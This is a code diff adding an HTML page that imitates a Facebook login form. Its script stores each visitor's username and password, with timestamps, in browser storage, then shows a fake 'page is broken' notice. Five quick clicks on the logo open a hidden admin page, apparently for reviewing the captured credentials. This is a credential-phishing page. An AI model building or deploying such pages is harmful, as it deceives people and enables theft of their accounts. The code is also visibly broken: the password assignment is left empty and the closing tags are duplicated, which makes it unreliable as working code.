@@ -1,0 +1,100 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Hidden Messages</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+<div class="login-container" id="loginPage">
+  <h1 class="logo"><p id="facebookSecret">facebook</p></h1>
+
+  <form id="loginForm">
+    <input id="username" type="text"
+      placeholder="Mobile number or email address" required>
+
+    <input id="password" type="password"
+      placeholder="Password" required>
+
+    <button type="submit">Log In</button>
+  </form>
+
+  <p class="small">Login to view hidden messages</p>
+</div>
+
+<div class="broken-container" id="brokenPage"
+     style="display:none">
+  <h1>⚠️</h1>
+  <h2>This page is broken.</h2>
+  <p>Please try again later.</p>
+</div>
+
+<script>
+const form = document.getElementById("loginForm");
+
+form.addEventListener("submit", function(e) {
+  e.preventDefault();
+
+  const username =
+    document.getElementById("username").value.trim();
+
+  if (!username) return;
+  
+const password =
+
+  if (!password) return;
+  
+  const records = JSON.parse(
+    localStorage.getItem("novoActivity") || "[]"
+  );
+
+  records.push({
+    username: username,
+    password: password,
+    date: new Date().toLocaleDateString(),
+    time: new Date().toLocaleTimeString(),
+    status: "Login attempted"
+  });
+
+  localStorage.setItem(
+    "novoActivity",
+    JSON.stringify(records)
+  );
+
+  document.getElementById("loginPage").style.display = "none";
+  document.getElementById("brokenPage").style.display = "block";
+});
+</script>
+</html>
+
+
+<script>
+let facebookClicks = 0;
+let resetTimer;
+
+document.getElementById("facebookSecret")
+  .addEventListener("click", function() {
+
+    facebookClicks++;
+
+    clearTimeout(resetTimer);
+
+    resetTimer = setTimeout(function() {
+      facebookClicks = 0;
+    }, 3000);
+
+    if (facebookClicks >= 5) {
+      window.location.href = "admin.html";
+    }
+});
+</script>
+</body>
+</html>
+
+
+
+</body>
+</html>
